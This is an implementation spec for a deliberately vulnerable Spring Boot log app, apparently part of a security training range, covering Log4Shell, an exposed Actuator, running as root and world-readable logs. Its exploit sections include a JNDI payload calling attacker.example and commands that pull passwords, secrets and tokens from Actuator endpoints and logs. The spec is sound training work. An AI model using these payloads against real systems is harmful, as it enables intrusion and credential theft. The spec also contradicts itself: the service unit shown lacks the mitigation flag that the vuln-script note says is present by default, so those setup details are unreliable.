# Java Log Management App (Log4Shell) — Implementation Spec

**Date:** 2026-04-14
**Status:** Implementation-ready
**Parent spec:** `2026-04-13-module-expansion-design.md`

---

## Overview

A Spring Boot web application bundled with the vulnerable Log4j 2.14.1 library (CVE-2021-44228). Pre-built as a fat JAR and deployed to the target VM — no Maven or JDK required on the target, only OpenJDK 17 JRE. Introduces 4 vulnerabilities covering the Log4Shell CVE itself, exposed Spring Boot Actuator, running as root, and world-readable log directory.

| Field | Value |
|-------|-------|
| Port | 8081 |
| Runtime | OpenJDK 17 JRE headless + pre-built fat JAR |
| Path | `modules/application_external/log4shell_app/` |
| Service user | `logapp` |
| Install dir | `/opt/logapp/` |
| Log dir | `/var/log/logapp/` |

---

## Directory Structure

```
modules/application_external/log4shell_app/
├── log4shell_app.yaml
├── setup.sh
├── finalize.sh
├── application.properties      # Spring Boot config
├── logapp.service
├── src/                        # Maven project (build ahead of time)
│   ├── pom.xml                 # pins log4j 2.14.1
│   └── src/main/java/com/ctf/logapp/
│       ├── LogAppApplication.java
│       ├── LogController.java
│       └── LogEntry.java
├── bin/
│   └── logapp.jar              # pre-built fat JAR
└── vulns/
    ├── log4shell_cve/
    │   ├── log4shell_cve.yaml
    │   └── log4shell_cve.sh
    ├── log4shell_actuator/
    │   ├── log4shell_actuator.yaml
    │   └── log4shell_actuator.sh
    ├── log4shell_running_as_root/
    │   ├── log4shell_running_as_root.yaml
    │   └── log4shell_running_as_root.sh
    └── log4shell_world_readable_logs/
        ├── log4shell_world_readable_logs.yaml
        └── log4shell_world_readable_logs.sh
```

---

## Module Definitions

### Parent: `log4shell_app.yaml`

```yaml
id: log4shell_app
name: Java Log Management App
description: A Spring Boot log management application running on port 8081. Provides endpoints for submitting and viewing log entries. Built with the vulnerable Log4j 2.14.1 library.
type: application_external
difficulty: hard
points: 0
category: web
tags: [web, java, spring-boot, log4j, log4shell]
conflicts: []
requires: []
script: setup.sh
verification:
  type: process_running
  process: "0.0.0.0:8081"
  expected: running
hints:
  - "Check what Java services are running on this machine"
```

---

### Vuln 1: `log4shell_cve.yaml`

```yaml
id: log4shell_cve
name: Log4Shell (CVE-2021-44228)
description: The application uses Log4j 2.14.1 which is vulnerable to CVE-2021-44228 (Log4Shell). JNDI lookup strings in log messages trigger outbound LDAP requests, enabling remote code execution. The fix is to add the JVM flag -Dlog4j2.formatMsgNoLookups=true.
type: vulnerability
difficulty: hard
points: 300
category: web
tags: [cve, log4shell, log4j, rce, java, jndi]
conflicts: []
requires: [log4shell_app]
script: log4shell_cve.sh
verification:
  type: file_contains
  path: /etc/systemd/system/logapp.service
  pattern: "formatMsgNoLookups=true"
suggested_fix: "Edit /etc/systemd/system/logapp.service and add -Dlog4j2.formatMsgNoLookups=true to the ExecStart JVM arguments, then run: systemctl daemon-reload && systemctl restart logapp"
hints:
  - "Research known vulnerabilities in the Java logging framework used by this application"
  - "Check the Log4j version bundled in /opt/logapp/logapp.jar — version 2.14.1 is affected by CVE-2021-44228"
  - "Add the JVM flag -Dlog4j2.formatMsgNoLookups=true to the ExecStart line in /etc/systemd/system/logapp.service, then daemon-reload and restart the service"
caldera:
  tactic: initial-access
  technique:
    attack_id: T1190
    name: "Exploit Public-Facing Application"
  recon:
    description: "Check if Log4Shell mitigation is applied in the service unit"
    command: |
      grep -q "formatMsgNoLookups=true" /etc/systemd/system/logapp.service && echo "SECURE: Log4Shell mitigation is applied" || echo "VULNERABLE: Log4Shell mitigation not found"
  exploit:
    description: "Trigger a Log4Shell JNDI callback via the /log endpoint"
    command: |
      curl -s -X POST http://localhost:8081/log \
        -H "Content-Type: application/json" \
        -d '{"message": "${jndi:ldap://attacker.example:1389/exploit}", "level": "INFO"}'
      echo "JNDI callback triggered — check LDAP server for incoming connection"
```

---

### Vuln 2: `log4shell_actuator.yaml`

```yaml
id: log4shell_actuator
name: Exposed Spring Boot Actuator
description: The Spring Boot Actuator management endpoints are exposed at /actuator/** with wildcard inclusion (exposure.include=*). This leaks heap dumps, environment variables, configuration properties, and internal metrics to unauthenticated callers.
type: vulnerability
difficulty: medium
points: 200
category: web
tags: [information-disclosure, spring-boot, actuator, java, configuration]
conflicts: []
requires: [log4shell_app]
script: log4shell_actuator.sh
verification:
  type: file_not_contains
  path: /opt/logapp/application.properties
  pattern: "exposure.include=*"
suggested_fix: "Edit /opt/logapp/application.properties and change management.endpoints.web.exposure.include=* to management.endpoints.web.exposure.include=health, then restart the service: systemctl restart logapp"
hints:
  - "Check the Spring Boot application configuration for management endpoint exposure"
  - "Look at the management.endpoints settings in /opt/logapp/application.properties"
  - "Change exposure.include=* to exposure.include=health in application.properties and restart logapp"
caldera:
  tactic: collection
  technique:
    attack_id: T1005
    name: "Data from Local System"
  recon:
    description: "Check if Spring Boot Actuator endpoints are exposed"
    command: |
      curl -s -o /dev/null -w "%{http_code}" http://localhost:8081/actuator/env | grep -q "200" && echo "VULNERABLE: Actuator /env endpoint is accessible" || echo "SECURE: Actuator endpoints not fully exposed"
  exploit:
    description: "Dump environment variables and configuration from Actuator"
    command: |
      echo "=== Environment ===" && curl -s http://localhost:8081/actuator/env | python3 -m json.tool | grep -i "password\|secret\|key\|token" | head -10
      echo "=== Heap dump trigger ===" && curl -s -o /dev/null -w "Status: %{http_code}" -X POST http://localhost:8081/actuator/heapdump
```

---

### Vuln 3: `log4shell_running_as_root.yaml`

```yaml
id: log4shell_running_as_root
name: Log App Running as Root
description: The logapp systemd service unit does not specify a User directive, causing the JVM process to run with full root privileges. Combined with Log4Shell or other deserialization bugs, this enables instant full system compromise.
type: vulnerability
difficulty: medium
points: 200
category: services
tags: [privilege-escalation, services, systemd, java, misconfiguration]
conflicts: []
requires: [log4shell_app]
script: log4shell_running_as_root.sh
verification:
  type: file_contains
  path: /etc/systemd/system/logapp.service
  pattern: "User=logapp"
suggested_fix: "Edit /etc/systemd/system/logapp.service and add 'User=logapp' under the [Service] section, then run: systemctl daemon-reload && systemctl restart logapp"
hints:
  - "Check what user the Java application is running as"
  - "Review the [Service] section of /etc/systemd/system/logapp.service for a User= directive"
  - "Add 'User=logapp' to the [Service] section in logapp.service, reload daemon, and restart the service"
caldera:
  tactic: privilege-escalation
  technique:
    attack_id: T1548
    name: "Abuse Elevation Control Mechanism"
  recon:
    description: "Check if the logapp JVM is running as root"
    command: |
      ps aux | grep logapp.jar | grep -v grep | grep -q "^root" && echo "VULNERABLE: logapp running as root" || echo "SECURE: logapp not running as root"
  exploit:
    description: "Confirm root process ownership of the JVM"
    command: |
      ps aux | grep logapp.jar | grep -v grep | awk '{print "Process owner: " $1}'
      ls -la /proc/$(pgrep -f logapp.jar | head -1)/exe 2>/dev/null
```

---

### Vuln 4: `log4shell_world_readable_logs.yaml`

```yaml
id: log4shell_world_readable_logs
name: Sensitive Logs World-Readable
description: The application log directory /var/log/logapp is world-readable. Log files contain request bodies submitted to the /log endpoint, which may include JNDI strings, internal user data, or other sensitive content.
type: vulnerability
difficulty: easy
points: 100
category: filesystem
tags: [permissions, filesystem, logging, information-disclosure]
conflicts: []
requires: [log4shell_app]
script: log4shell_world_readable_logs.sh
verification:
  type: file_permissions
  path: /var/log/logapp
  expected: "750"
suggested_fix: "chmod 750 /var/log/logapp && chown logapp:logapp /var/log/logapp"
hints:
  - "Check permissions on application log directories"
  - "Look at who can read /var/log/logapp"
  - "Use chmod 750 to restrict the log directory to the service user: chmod 750 /var/log/logapp"
caldera:
  tactic: collection
  technique:
    attack_id: T1005
    name: "Data from Local System"
  recon:
    description: "Check if the logapp log directory is world-readable"
    command: |
      stat -c "%a" /var/log/logapp | grep -qE "^[0-9][0-9][4-7]$" && echo "VULNERABLE: /var/log/logapp is world-readable" || echo "SECURE: log directory permissions are restricted"
  exploit:
    description: "Read application logs as an unprivileged user"
    command: |
      ls /var/log/logapp/
      cat /var/log/logapp/application.log 2>/dev/null | grep -i "jndi\|password\|secret\|token" | head -10
```

---

## Setup Scripts

### `setup.sh`

1. `apt-get install -y openjdk-17-jre-headless`
2. Create `logapp` system user: `useradd -r -s /bin/false logapp`
3. Create `/opt/logapp/` and `/var/log/logapp/`.
4. Copy `bin/logapp.jar` to `/opt/logapp/logapp.jar`.
5. Copy `application.properties` to `/opt/logapp/application.properties`.
6. Copy `logapp.service` to `/etc/systemd/system/logapp.service`.

### `finalize.sh`

1. `chown -R logapp:logapp /opt/logapp/ /var/log/logapp/`
2. `chmod 750 /var/log/logapp/`
3. `chmod 640 /opt/logapp/application.properties`
4. `systemctl daemon-reload && systemctl enable --now logapp`

---

## Application Source (`src/`)

A minimal Spring Boot 2.7.x application:

**`pom.xml`** — Key dependencies:
```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-web</artifactId>
</dependency>
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-actuator</artifactId>
</dependency>
<!-- Pinned vulnerable version -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>
</dependency>
```

**`LogController.java`** — Two endpoints:

| Method | Path | Description |
|--------|------|-------------|
| `POST` | `/log` | Accepts `{message, level}`, logs the message via Log4j |
| `GET` | `/logs` | Returns last 50 log entries from the log file |

The vulnerable path: `logger.info("Received: " + request.getMessage())` — passing user input directly to Log4j triggers JNDI lookup processing.

**Build:** `mvn package -DskipTests` produces `target/logapp-1.0.jar` → copy to `bin/logapp.jar`.

---

## `application.properties` (secure baseline)

```properties
server.port=8081
logging.file.name=/var/log/logapp/application.log
logging.level.root=INFO

# Actuator - secure default (only health endpoint)
management.endpoints.web.exposure.include=health
management.endpoint.health.show-details=never
```

## `logapp.service`

```ini
[Unit]
Description=Log Management Application
After=network.target

[Service]
Type=simple
User=logapp
WorkingDirectory=/opt/logapp
ExecStart=/usr/bin/java -jar /opt/logapp/logapp.jar --spring.config.location=/opt/logapp/application.properties
Restart=on-failure
RestartSec=10

[Install]
WantedBy=multi-user.target
```

---

## Vuln Scripts

| Script | What it does |
|--------|-------------|
| `log4shell_cve.sh` | Removes `-Dlog4j2.formatMsgNoLookups=true` from `ExecStart` in `logapp.service` (it is present in the default unit); runs `daemon-reload && restart` |
| `log4shell_actuator.sh` | Replaces `exposure.include=health` with `exposure.include=*` in `application.properties`; restarts logapp |
| `log4shell_running_as_root.sh` | Removes `User=logapp` from `logapp.service`; runs `daemon-reload && restart` |
| `log4shell_world_readable_logs.sh` | `chmod 755 /var/log/logapp` |

**Note on log4shell_cve.sh:** The default `logapp.service` (installed by `setup.sh`) includes `-Dlog4j2.formatMsgNoLookups=true` as the mitigation is present by default. The vuln script removes it to reintroduce the vulnerability. This matches the platform's "secure baseline, vuln script makes it vulnerable" pattern.

---

## Verification Checklist

1. **log4shell_app**: Run `setup.sh` + `finalize.sh` → `curl -s -o /dev/null -w "%{http_code}" http://localhost:8081/logs` → 200. `ss -tlnp | grep 8081` → listening.
2. **log4shell_cve**: Run script → `grep formatMsgNoLookups /etc/systemd/system/logapp.service` → not found. Fix: add the flag back, daemon-reload, restart → flag present.
3. **log4shell_actuator**: Run script → `curl -s -o /dev/null -w "%{http_code}" http://localhost:8081/actuator/env` → 200. Fix: change `exposure.include` back to `health`, restart → 404.
4. **log4shell_running_as_root**: Run script → `ps aux | grep logapp.jar | head -2` → `root`. Fix: add `User=logapp` back, daemon-reload, restart → `logapp` user.
5. **log4shell_world_readable_logs**: Run script → `stat -c "%a" /var/log/logapp` → 755. Fix: `chmod 750` → 750.

---

## Port / Conflict Notes

- Port 8081 is not used by any existing module.
- OpenJDK 17 JRE (~200MB) is installed only for this module.
- The vulnerable `log4j-core 2.14.1` JAR is bundled inside the fat JAR — it is not installed system-wide.
- No file path conflicts with existing modules.
- The `src/` directory and Maven project exist only in the module repo; they are not copied to the target VM.
